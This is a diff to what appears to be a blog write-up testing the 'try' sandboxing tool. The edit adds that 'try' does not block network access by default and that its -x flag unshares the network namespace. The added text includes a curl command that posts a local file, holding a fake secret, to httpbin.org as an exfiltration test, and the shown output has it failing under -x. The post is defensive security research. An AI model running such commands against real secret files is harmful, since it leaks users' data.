@@ -61,7 +61,7 @@ The easy fix is to allow \`~/.npm\`, but every allowed folder becomes a trusted 
 
 ## Finding 3: what try can't see
 
-try records every file a command creates, modifies or deletes. But it cannot record file reads. It also doesn't restrict the network, so a command run through try has the same network access as usual.
+try records every file a command creates, modifies or deletes. But it cannot record file reads. By default it also doesn't restrict the network, so a command run through try has the same network access as usual.
 
 Put those together, and exfiltration is possible. I tested it with a fake secret: a file containing the word \`fake\`, sent to httpbin.org, a public service that echoes back whatever you send it.
 
@@ -83,7 +83,14 @@ $
 
 The file's contents reached the server. And that's the whole output, no change list and no prompt. try had nothing to show me, because no file changed. The same thing could happen with a real secret.
 
-Write-based rules can't catch exfiltration. That would take a network namespace or tracing system calls.
+Write-based rules can't catch exfiltration. That takes a network namespace or tracing system calls, and try does offer the first one. Running with \`-x\` unshares the network namespace, and the same test fails before anything is sent.
+
+\`\`\`
+$ try -x curl -sS --data-binary @/home/victoriayang/fake.txt https://httpbin.org/post
+curl: (6) Could not resolve host: httpbin.org
+\`\`\`
+
+The protection exists, but you have to know to ask for it.
 
 ## Smaller things
 
